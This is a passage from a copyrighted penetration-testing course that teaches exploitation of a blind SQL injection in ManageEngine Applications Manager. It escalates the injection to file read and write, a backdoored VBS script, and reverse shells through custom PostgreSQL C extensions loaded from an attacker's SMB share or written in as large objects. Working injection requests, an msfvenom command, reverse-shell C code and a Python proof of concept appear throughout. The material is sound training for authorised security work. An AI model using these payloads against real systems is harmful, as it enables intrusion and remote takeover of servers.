5.4 Blind Bats 
Now that we have all of our tools and methods worked out in theory, let’s try to attack the 
application and see how far we can take it. So far we have mostly played with unterminated 
queries to understand the limitations in the attacker-provided input. We have, however, briefly 
shown how to use stacked queries in our payload when we tested the blind SQL injection 
vulnerability with the help of the pg_sleep function. 
As a reminder, the following GET request shows how to execute arbitrary stacked queries 
exploiting the vulnerable AMUserResourcesSyncServlet servlet: 
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;<some query>;--+ 
HTTP/1.0 
Host: manageengine:8443 
Listing 149 - The ability for us to execute arbitrary SQL statements through stacked queries 
Now that we can bypass the quotes restriction and are able to execute arbitrary stacked queries, 
it would be helpful to verify what database privileges the vulnerable application is running with. 
This is very important because if the application is running with database administrator (DBA) 
privileges, we will have access to more powerful functionalities such as the ability to interact with 
 
56 (The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/sql-syntax-lexical.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
149 
the file system and potentially load third-party PostgreSQL extensions (native C++ code). More on 
that later! 
Therefore let’s try to develop a working payload that will reveal if we are DBA or not. Remember 
that we have to use a time-based injection payload due to lack of verbose output from the 
application while using stacked queries. 
The following SQL query validates that we are, in fact, a DBA user of the database: 
SELECT current_setting('is_superuser'); 
Listing 150 - Checking our DB privileges 
 
Figure 111: The “on” result indicates we have DBA privileges 
Figure 111 shows that the result returned by the query from Listing 150 is the string “on”. 
Therefore, to be able to use the query from the listing above in a time-based SQL injection attack, 
we could use a conditional statement to test the result string in conjunction with the pg_sleep 
function. The following SQL statement should do the trick: 
GET 
/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+cu
rrent_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+ 
Host: manageengine:8443 
Listing 151 - Checking if we are DBA 
The injected query shown in Listing 151 will only sleep for 10 seconds if the is_superuser setting 
from the current_setting table is set to “on.” 
5.4.1.1 Exercise 
Implement the time based payload from Listing 151 in the provided proof of concept Python 
script (Listing 133). 
5.5 Accessing the File System 
While getting access to all the information contained in the ManageEngine database is a good 
achievement, we are operating under the privileges of the DBA user. Therefore, we have access to 
far more powerful functionalities than simply extracting information contained in the database. 
In these situations, our goal is typically to gain system access leveraging the database layer. 
Usually, this is done by using database functions to read and write to the target file system. Other 
options, when supported, are to execute system commands through the database or to extend 
the database functionality to execute system commands or custom code. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
150 
Let’s explore these options. In order for us to access the file system, we need to develop a 
different and valid injection query. Once again, we will take advantage of the fact that we have the 
ability to perform stacked queries in our attack. 
If you recall, we have already used the PostgreSQL function called COPY57 in a previous example 
in Listing 146. This function allows us to read or write to the file system as shown in the following 
example syntax taken from the PostgreSQL manual: 
COPY <table_name> from <file_name> 
Listing 152 - Reading content from files 
COPY <table_name> to <file_name> 
Listing 153 - Writing content to files 
The idea behind the COPY function is that it is used for importing or exporting data using a table 
and a file. However, that is a rather loose definition, and in the case of COPY TO, we do not need a 
valid table. We can perform a sub query to return arbitrary content. The following query 
demonstrates this idea: 
COPY (select $$awae$$) to <file_name> 
Listing 154 - Using a subquery to return valid data so that the COPY operation can write to a file 
Since we have stacked queries, it’s also possible to read files, although it is slightly more complex. 
This will require us to create a table, select data from a file into that table, select the contents of 
the table, and then delete the table. The syntax for that complete operation is shown below: 
CREATE temp table awae (content text); 
COPY awae from $$c:\awae.txt$$; 
SELECT content from awae; 
DROP table awae; 
Listing 155 - Reading content from file C:\awae.txt 
We can implement this attack in a blind time-based query as follows: 
GET 
/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(con
tent+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+conten
t+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0 
Host: manageengine:8443 
Listing 156 - Reading the first character of the fle C:\awae.txt and comparing it with the letter “h”. If the letter is “h”, sleep 
for 10 seconds. 
Note again that we cannot directly read the data from the file in the server’s response when we 
use stacked queries. Therefore, the request will once again use a time-based comparison logic to 
infer the data. If the comparison evaluates to true, the query will sleep for 10 seconds. Using this 
technique, we can extract the contents of any file. 
Notice how in this case, we make use of the substr and ascii functions. While the former helps us 
reading the file content byte by byte, the latter ensures we avoid any text encoding/decoding 
issues. This is especially important for reading binary files. 
 
57 (The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/sql-copy.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
151 
Taking the idea of file system interaction further, our next goal would be to remotely write to the 
targets file system. Let’s develop a query that will write a file on the C:\ drive of the vulnerable 
server: 
COPY (SELECT $$offsec$$) to $$c:\\offsec.txt$$; 
Listing 157 - A simple query that will write to the disk in c: 
 
We can translate that into the following request: 
GET 
/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to
+$$c:\\offsec.txt$$;--+ HTTP/1.0 
Host: manageengine:8443 
Listing 158 - Writing to the file system using our SQL Injection vulnerability 
All we have to do now is check the target’s C:\ directory for the offsec.txt file. As shown in Figure 
112, it appears that we have succeeded! 
 
Figure 112: Writing to the file system as SYSTEM. 
Notice that not only are we running as DBA but also, the web application is running under the 
context of the SYSTEM user! 
5.5.1.1 Exercise 
1. 
Using what you have learned, implement a SQL injection query in your Python script that will 
write a text file to the target system. 
2. 
See if you can write binary data to a file using the COPY TO technique. Why might this not 
work? 
5.5.2 Reverse Shell Via Copy To 
Now that we have demonstrated that we can write arbitrary files anywhere on the system, we can 
try to leverage this ability to get a reverse shell. One of the possible attacks is to overwrite an 
existing batch file that is used by the ManageEngine application. The idea is that we can insert our 
malicious commands into a batch file that will get executed by the ManageEngine application. As 
this is not our preferred solution, we will leave that as an exercise for the reader. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
152 
A more elegant way would be to introduce malicious code into the VBS files that are used by the 
ManageEngine application during normal operation. Specifically, when the ManageEngine 
Application Manager is configured to monitor remote servers and applications (that is its job after 
all), a number of VBS scripts are executed on a periodic basis. These scripts are located in the 
C:\Program\ 
Files\ 
(x86)\ManageEngine\AppManager12\working\conf\application\scripts 
directory and vary by functionality. 
Before we proceed, we need to make sure that there is indeed at least one instance of a monitor 
targeting a Windows system. For the purposes of this exercise, we created a monitor against the 
ManageEngine host itself. 
When setting up the monitor against the ManageEngine host itself, we must use 
the network IP, 192.168.121.113 in our environment, instead of the localhost or 
127.0.0.1 
 
Figure 113: Example Application Manager monitor 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
153 
5.5.2.1.1 
 
 
Figure 114: The monitor polling time is set to 1 minute 
If we run the Sysinternals Process Monitor58 tool with a VBS path filter on our target host, we can 
see that one of the files that is executed on a regular basis is wmiget.vbs. The frequency of the 
execution is determined by the polling time setting within the application for a given Application 
Manager monitoring instance. 
 
Figure 115: Process Monitor can help us identify which VBS scripts are used by the Application Manager 
Since we know that this script is executed by the application, we can generate a meterpreter 
reverse shell payload and insert it at the end of the file. The tasks performed by the target VBS 
 
58 (MicroSoft, 2019), https://docs.microsoft.com/en-us/sysinternals/downloads/procmon 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
154 
script are not important to us. However, we want to make sure that the original functionality of 
the script is maintained as we would like to stay as stealthy as possible. 
A few things we need to keep in mind are: 
1. 
We need to make a backup copy of the target file as we will need to restore it once we are 
done with this attack vector. 
2. 
We have to convert the content of the target file to a one-liner and make sure it is still 
executing properly before appending our payload. This is because COPY TO can’t handle 
newline control characters in a single SELECT statement. 
3. 
Our payload must also be on a single line for the same reason as stated above. 
4. 
We have to encode our payload twice in the GET request. We need to use base64 encoding 
to avoid any issues with restricted characters within the COPY TO function and we also need 
to urlencode the payload so that nothing gets mangled by the web server itself. Finally, we 
need to use the convert_from function to convert the output of the decode function to a 
human-readable format. The general query that we will use for the injection looks like this: 
copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to 
$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\s
cripts\\wmiget.vbs$$; 
Listing 159 - General structure of the query we inject 
5. 
We need to use a POST request due to the size of the payload, as it exceeds the limits of 
what a GET request can process. This is not an issue because, as we previously saw, the 
doPost function simply ends up calling the doGet function. 
Before putting all the pieces together let’s generate our meterpreter reverse shell using the 
following command on Kali: 
kali@kali:~$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp 
LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs 
Listing 160 - Generating a VBS reverse shell 
As a reminder, this is what the original wmiget.vbs looked like. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
155 
 
Figure 116: Original VBS file 
In the end, the resulting complete file should look similar to this: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
156 
 
Figure 117: Final version of the injected VBS file 
Once we have tested the injected file manually from the target server by simply executing it from 
a command line and making sure that we receive a reverse shell, we can finally transfer the 
contents of the VBS file to our Kali machine. There, we can use the Burp Suite Decoder feature to 
URL-encode our payload and finally trigger our injection. Before we do that however, we need to 
make sure that the target file on the ManageEngine server is restored to its original version, so 
that we can verify that the SQL injection truly worked. 
If everything works out as planned, after one minute at most (remember the polling time we set in 
Figure 114), we should receive a reverse shell as shown below. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
157 
 
Figure 118: A reverse shell via a backdoored VBS file 
A nice characteristic of this attack vector is that it is also persistent. However, this approach may 
not always be possible because it is specific to the ManageEngine installations running on 
Windows hosts. Because of this we will describe a more generic approach in the remainder of 
this module. 
5.5.2.2 Exercises 
1. 
Overwrite a batch file that is executed on startup of Application Manager and obtain a 
reverse shell. Is it possible to do so without damaging the application? Remember to make a 
backup copy of the batch file you are overwriting. 
2. 
Recreate the described VBS attack vector and obtain a reverse shell. 
3. 
Implement the VBS attack in your Python proof of concept. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
158 
5.5.2.3 Extra Mile 
There is at least one additional attack vector which involves manipulation of Java class files and 
the use of JSP files. While not simple, it can be accomplished. See if you can find and exploit this 
additional vector. 
5.6 PostgreSQL Extensions 
While our previous example of a backdoored application script was arguably elegant, it relied on 
the existence of an application file that was suitable for that attack vector, i.e. a file executed by 
the web application. As that may not always be the case, we need to investigate alternative ways 
to achieve our goal. For example, it may be possible to load a database extension to define our 
own SQL functions that will allow us to gain remote code execution directly. 
After reading the Postgres documentation, we learned that we can load an extension using the 
following syntax style: 
CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' 
STRICT; 
Listing 161 - Basic SQL syntax to create a function from a local library 
However, there is an important restriction that we need to keep in mind. The compiled extension 
we want to load must define an appropriate Postgres structure (magic block) to ensure that a 
dynamically library file is not loaded into an incompatible server. 
If the target library doesn’t have this magic block (as is the case with all standard system 
libraries), then the loading process will fail. 
Let’s take a look at an example: 
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 
'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT; 
SELECT system('hostname'); 
ERROR:  incompatible library "c:\Windows\System32\kernel32.dll": missing magic block 
HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro. 
 
********** Error ********** 
Listing 162 - Attempting to load a Windows DLL. 
As shown in the listing above, the loading process failed which means that we are going to have 
to compile a custom dynamic library. While that may sound daunting, we will soon discover that it 
is very much within our grasp. 
5.6.1 Build Environment 
Our ManageEngine virtual machine comes with a pre-configured build environment for Visual 
Studio 2017. Let’s start by opening up the awae project that you should see pinned in the Recent 
Solution Visual Studio bottom right window pane (Figure 119). 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
159 
 
Figure 119: awae project in Recent Solution. 
 
Figure 120: Overview of the AWAE Visual Studio solution. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
160 
The following example code can be found in the poc.c source file within the awae solution: 
01: #include "postgres.h" 
02: #include <string.h> 
03: #include "fmgr.h" 
04: #include "utils/geo_decls.h" 
05: #include <stdio.h> 
06: #include "utils/builtins.h" 
07:  
08: #ifdef PG_MODULE_MAGIC 
09: PG_MODULE_MAGIC; 
10: #endif 
11:  
12: /* Add a prototype marked PGDLLEXPORT */ 
13: PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS); 
14: PG_FUNCTION_INFO_V1(awae); 
15:  
16: /* this function launches the executable passed in as the first parameter 
17: in a FOR loop bound by the second parameter that is also passed*/ 
18: Datum 
19: awae(PG_FUNCTION_ARGS) 
20: { 
21:     /* convert text pointer to C string */ 
22: #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, 
PointerGetDatum(textp))) 
23:  
24:     /* retrieve the second argument that is passed to the function (an integer) 
25:     that will serve as our counter limit*/ 
26:     int instances = PG_GETARG_INT32(1); 
27:  
28:     for (int c = 0; c < instances; c++) { 
29:         /*launch the process passed in the first parameter*/ 
30:         ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1); 
31:     } 
32:     PG_RETURN_VOID(); 
33: } 
Listing 163 - Sample code to get you started 
Looking at the source code in Listing 163, we can see that the awae function will launch an 
arbitrary process (passed to the function as the first argument) using the Windows native 
ShellExecute function, in a loop that is bound by the second argument passed to the function. 
Although this example may seem trivial, it shows how we need to properly handle any argument 
that is passed to our function in a Postgres-specific DLL through the use of relevant Postgres 
macros (lines 22, 26 and 30). This will be useful later on to avoid hardcoding the IP address and 
port for our fully functional reverse shell User Defined Function (UDF). 
The template from Listing 163 should be all we need to build a basic extension. We can initiate 
the build process by pressing the C + B+ b keys in the virtual machine or going to Build > 
Build Solution in Visual Studio. 
------ Build started: Project: awae, Configuration: Release Win32 ------ 
   Creating library C:\Users\Administrator\source\repos\awae\Release\awae.lib and 
object C:\Users\Administrator\source\repos\awae\Release\awae.exp 
Generating code 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
161 
Finished generating code 
All 3 functions were compiled because no usable IPDB/IOBJ from previous compilation 
was found. 
rs.vcxproj -> C:\Users\Administrator\source\repos\awae\Release\awae.dll 
Done building project "rs.vcxproj". 
========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ========== 
Listing 164 - Building the new extension 
5.6.2 Testing the Extension 
In order to test our newly-built extension, we need to first create a UDF. We can look back on 
Listing 161 to remind ourselves how to create a custom function in PostgreSQL. 
For example, the following queries will create and run a UDF called test, bound to the awae 
function exported by our custom DLL. Note that we have moved the DLL file to the root of the C 
drive for easier command writing. 
create or replace function test(text, integer) returns void as $$C:\awae.dll$$, 
$$awae$$ language C strict; 
SELECT test($$calc.exe$$, 3); 
Listing 165 - The code to load the extension and run the test function 
If everything goes according to plan, once we execute the SELECT query and open up the Task 
Manager, we should see that there are indeed three running instances of calc.exe. 
If you are anything like us, you will likely make several mistakes as you are developing your code. 
When this happens, you may wish to unload the extension and restart from scratch. To do so, you 
must first stop the ManageEngine service: 
c:\> net stop "Applications Manager" 
The ManageEngine Applications Manager service was stopped successfully. 
Listing 166 - Stopping the ManageEngine service 
Once you have stopped the service, delete the DLL file that you loaded into the database memory 
space: 
c:\> del c:\awae.dll 
Listing 167 - Deleting the loaded extension 
Then start the service so we can go ahead and delete the test function. 
c:\> net start "Applications Manager" 
The ManageEngine Applications Manager service is starting. 
The ManageEngine Applications Manager service was started successfully. 
Listing 168 - Starting the ManageEngine service again 
Finally, execute the SQL statement to delete the test function: 
DROP FUNCTION test(text, integer); 
Listing 169 - Dropping the test function 
Now you are able to edit your extension code, re-compile, and re-test the extension. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
162 
5.6.3 Loading the Extension from a Remote Location 
As we have seen in the previous section, PostgreSQL is designed to be extensible and we are able 
to write our own extension DLL files and create UDFs based on those extensions. So far we have 
compiled and tested our malicious extension directly on the remote target server. In a real world 
scenario, we would need to find a way to upload the DLL to the victim server before we could 
actually load it. 
It is interesting to note that PostgreSQL does not limit us to working only with local files. In other 
words, the source DLL file we are using for the UDF could be also located on a network share. 
In order to quickly verify that, we can create a Samba share on our Kali VM and place our DLL 
there. 
You can use the Python Impacket SMB server script for this exercise as shown below. 
kali@kali:~$ mkdir /home/kali/awae 
 
kali@kali:~$ sudo impacket-smbserver awae /home/kali/awae/ 
[sudo] password for kali:  
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies 
 
[*] Config file parsed 
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed 
[*] Config file parsed 
[*] Config file parsed 
Listing 170 - Starting the Samba service with a simple configuration file to test remote DLL loading 
Once the Samba service is running, we can create a new Postgres UDF and point it to the DLL file 
hosted on the network share. 
CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS 
$$\\192.168.119.120\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT; 
SELECT remote_test($$calc.exe$$, 3); 
Listing 171 - Creating a UDF from a network share. 192.168.119.120 is the Kali attacker IP address. 
If we then run the SELECT query from our previous example using the remote_test function, we 
should once again see three instances of calc.exe in the Task Manager. 
5.6.3.1 Exercise 
Recreate the DLL files described in this section and make sure that your Postgres UDF functions 
successfully spawn calc.exe processes. 
5.7 UDF Reverse Shell 
Now that we have seen how to write and execute arbitrary code using PostgreSQL, the only thing 
remaining is to gain a reverse shell. 
At this point, this should not be too difficult. Nevertheless, the following partial C code should help 
you along the way. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
163 
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#include "postgres.h" 
#include <string.h> 
#include "fmgr.h" 
#include "utils/geo_decls.h" 
#include <stdio.h> 
#include <winsock2.h> 
#include "utils/builtins.h" 
#pragma comment(lib, "ws2_32") 
 
#ifdef PG_MODULE_MAGIC 
PG_MODULE_MAGIC; 
#endif 
 
/* Add a prototype marked PGDLLEXPORT */ 
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS); 
PG_FUNCTION_INFO_V1(connect_back); 
 
WSADATA wsaData; 
SOCKET s1; 
struct sockaddr_in hax; 
char ip_addr[16]; 
STARTUPINFO sui; 
PROCESS_INFORMATION pi; 
 
Datum 
connect_back(PG_FUNCTION_ARGS) 
{ 
 
    /* convert C string to text pointer */ 
#define GET_TEXT(cstrp) \ 
   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp))) 
 
    /* convert text pointer to C string */ 
#define GET_STR(textp) \ 
  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp))) 
 
    WSAStartup(MAKEWORD(2, 2), &wsaData); 
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, 
(unsigned int)NULL); 
 
    hax.sin_family = AF_INET; 
   /* FIX THIS */ 
    hax.sin_port = XXXXXXXXXXXXX 
    /* FIX THIS TOO*/ 
    hax.sin_addr.s_addr = XXXXXXXXXXXXXXX 
 
    WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL); 
 
    memset(&sui, 0, sizeof(sui)); 
    sui.cb = sizeof(sui); 
    sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); 
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1; 
 
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
164 
    PG_RETURN_VOID(); 
} 
Listing 172 - Postgres extension reverse shell 
Make sure that you fix the highlighted lines of code before you compile the code from the listing 
above. 
Once you have done so, you can use the following Python script to send your payload to the 
vulnerable server: 
import requests, sys 
requests.packages.urllib3.disable_warnings() 
 
def log(msg): 
   print msg 
 
def make_request(url, sql): 
   log("[*] Executing query: %s" % sql[0:80]) 
   r = requests.get( url % sql, verify=False) 
   return r 
 
def create_udf_func(url): 
   log("[+] Creating function...") 
   sql = "--------FIX ME--------" 
   make_request(url, sql) 
 
def trigger_udf(url, ip, port): 
   log("[+] Launching reverse shell...") 
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port)) 
   make_request(url, sql) 
    
if __name__ == '__main__': 
   try: 
       server = sys.argv[1].strip() 
       attacker = sys.argv[2].strip() 
       port = sys.argv[3].strip() 
   except IndexError: 
       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0] 
       sys.exit() 
        
   sqli_url  = 
"https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"  
   create_udf_func(sqli_url) 
   trigger_udf(sqli_url, attacker, port) 
Listing 173 - proof of concept script to trigger a reverse shell 
The script assumes that there is an available Samba share on a Kali VM that hosts a file named 
rev_shell.dll. Make sure that your attacking machine has that set up. Finally you will have to fix the 
SQL injection string in the above code before running the final script (see the highlighted FIX ME 
line in Listing 173). 
If everything goes well, you should receive a reverse shell like this: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
165 
 
Figure 121: Obtaining a reverse shell from a vulnerable ManageEngine system 
5.7.1.1 Exercise 
Fix the proof of concept from Listing 173 and recreate the attack described in the previous 
section in order to obtain a reverse shell. 
5.8 More Shells!!! 
While we hopefully managed to get a shell in the last section, we did so by utilizing a network 
share as the location for our DLL file. However, that can only work if we are already on an internal 
network. Technically speaking, one could do this on a public network as well, but egress filtering 
is more than likely to prevent this type of traffic across private network boundaries. 
An alternative to the remote Samba extension loading is to find a method to transfer the 
malicious DLL to the remote server directly through an SQL query. Considering that we already 
know how to write arbitrary files to the remote file system using the COPY TO function, we may be 
tempted to do just that in our payload. Unfortunately, that will not quite work with binary files. 
While we won’t go into details as to why that is the case, we strongly encourage you to try it and 
see where things go wrong. 
So, can we figure out a way to replicate the previous attack but this time without the network 
share requirement? Let’s Try Harder! 
5.8.1 PostgreSQL Large Objects 
Fortunately for us, PostgreSQL exposes a structure called large object, which is used for storing 
data that would be difficult to handle in its entirety. A typical example of data that can be stored 
as a large object in PostgreSQL is an image or a PDF document. As opposed to the COPY TO 
function, the advantage of large objects lies in the fact that the data they hold can be exported 
back to the file system as an identical copy of the original imported file. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
166 
We recommend reading more about large objects in the official documentation,59 but for now we 
will focus on those aspects of this structure and related functions that we need to accomplish our 
goal. 
First, let’s try to lay out our goal and the general steps we need to take to get there. Keep in mind 
that all of these steps should be accomplished using our original SQL injection vulnerability. 
1. 
Create a large object that will hold our binary payload (our custom DLL file we created in the 
previous section) 
2. 
Export that large object to the remote server file system 
3. 
Create a UDF that will use the exported DLL as source 
4. 
Trigger the UDF and execute arbitrary code 
Before we can do this however, we need to familiarize ourselves with the mechanics of working 
with large objects in PostgreSQL. 
In a normal course of action, a large object is created by calling the lo_import function while 
providing it the path to the file we want to import. 
amdb=# select lo_import('C:\\Windows\\win.ini'); 
 lo_import 
----------- 
    194206 
(1 row) 
 
amdb=# \lo_list 
          Large objects 
   ID   |  Owner   | Description 
--------+----------+------------- 
 194206 | postgres | 
(1 row) 
Listing 174 - A simple lo_import example 
In the listing above, we are importing the win.ini file into the database and as the return value, we 
are provided with the loid of the large object that was created. 
The loid value is an integral value to our entire plan as we need to reference it when we are 
exporting large objects. As we can see in Listing 174, the returned loid value appears arbitrary 
though. Considering we would not be able to see the returned value from the previous query when 
we execute it in a blind SQL injection, this is a bit of a problem. (Notice that when the use of UNION 
queries is possible, this is not a problem.) 
Fortunately, the lo_import function also allows us to set the loid field to any arbitrary value of our 
choice while creating a large object. This will help us solve the loid value problem. 
amdb=# select lo_import('C:\\Windows\\win.ini', 1337); 
 lo_import 
----------- 
 
59 (The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/largeobjects.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
167 
      1337 
(1 row) 
Listing 175 - A lo_import with a known loid 
With that in mind, to accomplish our goal, we can create a large object from an arbitrary file on 
the remote system and then directly update its entry in the database with the content of our 
choice. To do so, first we need to know where these large objects are stored in the database. With 
that said, the large objects are stored in a table called pg_largeobject. 
amdb=# select loid, pageno from pg_largeobject; 
 loid | pageno 
------+-------- 
 1337 |      0 
(1 row) 
Listing 176 - Large objects location 
An astute reader will notice the column pageno in the listing above. This is another critical piece 
of information we will need to be aware of. More specifically, when large objects are imported into 
a PostgreSQL database, they are split into 2KB chunks, which are then stored individually in the 
pg_largeobject table. 
As the PostgreSQL manual states: 
The amount of data per page is defined to be LOBLKSIZE (which is currently 
BLCKSZ/4, or typically 2 kB). 
Now that we know this, let’s try to update the data from the imported win.ini file from the previous 
example and then export it. 
First let’s see what data is in our large object entry right after import. 
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject; 
 loid | pageno |           encode 
------+--------+---------------------------- 
 1337 |      0 | ; for 16-bit app support\r+ 
      |        | [fonts]\r                 + 
      |        | [extensions]\r            + 
      |        | [mci extensions]\r        + 
      |        | [files]\r                 + 
      |        | [Mail]\r                  + 
      |        | MAPI=1\r                  + 
      |        | 
(1 row) 
Listing 177 - The contents of the win.ini file are in a large object 
Now, let’s update this entry. 
amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and 
pageno=0; 
UPDATE 1 
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject; 
 loid | pageno | encode 
------+--------+-------- 
 1337 |      0 | w00t 
(1 row) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
168 
Listing 178 - The contents of the large object are updated. 
Finally, we need to take a look at lo_export. As shown in the listing below, this function is used to 
export an arbitrary large object back to the file system using loid as the identifier. 
amdb=# select lo_export(1337, 'C:\\new_win.ini'); 
 lo_export 
----------- 
         1 
(1 row) 
Listing 179 - Large object export 
A quick look at the exported file shows that we have indeed successfully written a file with 
content of our choice to the file system. 
 
Figure 122: Exported large object contains manually updated content 
As was the case with Postgres UDFs, we also need to know how to delete large objects from the 
database during development as it is inevitable that mistakes will be made. 
The lo_list command can be used to show all large objects that are currently saved in the 
database. Then to delete a given large object from the database, we can use the lo_unlink 
function (Listing 180). 
amdb=# \lo_unlink 1337 
lo_unlink 1337 
amdb=# \lo_list 
      Large objects 
 ID | Owner | Description 
----+-------+------------- 
(0 rows) 
Listing 180 - Deleting large objects 
5.8.2 Large Object Reverse Shell 
At this point, we should be familiar with all the concepts necessary to execute our attack in its 
entirety and gain a reverse shell. Let’s revisit our original general plan from the previous sections 
and add a few more details: 
1. 
Create a DLL file that will contain our malicious code 
2. 
Inject a query that creates a large object from an arbitrary remote file on disk 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
169 
3. 
Inject a query that updates page 0 of the newly created large object with the first 2KB of our 
DLL 
4. 
Inject queries that insert additional pages into the pg_largeobject table to contain the 
remainder of our DLL 
5. 
Inject a query that exports our large object (DLL) onto the remote server file system 
6. 
Inject a query that creates a PostgreSQL User Defined Function (UDF) based on our exported 
DLL 
7. 
Inject a query that executes our newly created UDF 
This sure seems like a lot of work. Moreover, this needs some explanation as well, so let’s get to 
it. 
We have already seen how to create a basic PostgreSQL extension, so we can move to step 2. 
But why are we even using lo_import first and not directly creating relevant entries in the 
pg_largeobject table? The main reason for this is because lo_import also creates additional 
metadata in other tables as well, which are necessary for the lo_export function to work properly. 
We could do all of this manually, but why? 
Next we need to deal with the 2KB page boundaries. You may wonder why we don’t simply put 
our entire payload into page 0 and export that. Sadly, that won’t work. If any given page contains 
more than 2048 bytes of data, lo_export will fail. This is why we have to create additional pages 
with the same loid. 
The remainder of our steps should look familiar based on the lessons we previously learned in 
this module. 
